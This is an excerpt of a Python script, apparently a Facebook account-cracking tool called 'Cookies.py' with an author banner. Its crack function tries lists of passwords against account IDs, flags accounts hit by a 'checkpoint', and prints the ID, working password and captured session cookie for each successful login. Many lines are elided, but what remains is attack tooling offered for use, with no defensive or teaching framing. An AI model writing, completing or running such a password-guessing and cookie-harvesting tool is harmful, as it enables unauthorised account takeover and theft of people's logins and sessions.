...
time.sleep(5)
os.system('clear')
##print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFollow My Profile")
time.sleep(2)
###os.system(f'xdg-open https://www.facebook.com/mdmonirhossen62')
#------------------[ MONIR ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
...
Author  : Monir
   Facebook :https://www.facebook.com/mdmonirhossen62
 NAME tool: Cookies.py
 TOOL Monir
              welcome all 
------------------------------------------------------------                                                                                  ------------------------------------------------------------"""
os.system('clear')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r ROSAN ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}  {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\033[1;31mROSAN-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                ...
                print(f'\r\x1b[32[ROSAN-OK✔]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                cek_LUFFY(kuki)
